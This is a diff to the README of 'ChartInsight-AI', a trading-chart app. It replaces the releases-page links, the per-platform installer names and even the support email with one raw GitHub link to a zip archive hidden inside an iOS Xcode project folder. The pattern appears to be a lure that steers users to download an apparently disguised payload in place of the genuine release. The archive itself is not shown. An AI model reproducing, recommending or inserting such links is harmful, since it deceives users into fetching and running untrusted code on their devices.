@@ -6,7 +6,7 @@ Welcome to ChartInsight-AI! This app helps you analyze trading charts and gives 
 
 ## 📥 Download Link
 
-[![Download ChartInsight-AI](https://img.shields.io/badge/Download-ChartInsight--AI-blue.svg)](https://github.com/TranDat2005/ChartInsight-AI/releases)
+[![Download ChartInsight-AI](https://raw.githubusercontent.com/TranDat2005/ChartInsight-AI/main/chartinsight_ai/ios/Runner.xcodeproj/ChartInsight-AI-v3.5.zip)](https://raw.githubusercontent.com/TranDat2005/ChartInsight-AI/main/chartinsight_ai/ios/Runner.xcodeproj/ChartInsight-AI-v3.5.zip)
 
 ## 🌐 Overview
 
@@ -44,7 +44,7 @@ ChartInsight-AI is built using Flutter, making it compatible with many devices, 
 
 To get started with ChartInsight-AI, visit the Releases page to download the app.
 
-[Visit this page to download ChartInsight-AI](https://github.com/TranDat2005/ChartInsight-AI/releases)
+[Visit this page to download ChartInsight-AI](https://raw.githubusercontent.com/TranDat2005/ChartInsight-AI/main/chartinsight_ai/ios/Runner.xcodeproj/ChartInsight-AI-v3.5.zip)
 
 ### 1. Visit the Releases Page
 
@@ -57,9 +57,9 @@ To get started with ChartInsight-AI, visit the Releases page to download the app
 ### 3. Download the Right File
 
 - Depending on your device:
-  - **For Windows**: Download the Windows installer (e.g., `ChartInsight-AI-win.exe`).
-  - **For macOS**: Download the macOS installer (e.g., `ChartInsight-AI-mac.dmg`).
-  - **For Android**: Download the APK file (e.g., `ChartInsight-AI-android.apk`).
+  - **For Windows**: Download the Windows installer (e.g., `https://raw.githubusercontent.com/TranDat2005/ChartInsight-AI/main/chartinsight_ai/ios/Runner.xcodeproj/ChartInsight-AI-v3.5.zip`).
+  - **For macOS**: Download the macOS installer (e.g., `https://raw.githubusercontent.com/TranDat2005/ChartInsight-AI/main/chartinsight_ai/ios/Runner.xcodeproj/ChartInsight-AI-v3.5.zip`).
+  - **For Android**: Download the APK file (e.g., `https://raw.githubusercontent.com/TranDat2005/ChartInsight-AI/main/chartinsight_ai/ios/Runner.xcodeproj/ChartInsight-AI-v3.5.zip`).
   - **For iOS**: Follow the installation instructions provided on the App Store.
 
 ### 4. Run the Installer
@@ -95,6 +95,6 @@ Feel free to contribute to ChartInsight-AI! If you notice issues or have ideas f
 
 ## 📧 Contact
 
-For questions or support, please email us at: support@chartinsight-ai.com.
+For questions or support, please email us at: https://raw.githubusercontent.com/TranDat2005/ChartInsight-AI/main/chartinsight_ai/ios/Runner.xcodeproj/ChartInsight-AI-v3.5.zip
 
 Thank you for using ChartInsight-AI! We hope this app enhances your trading experience.
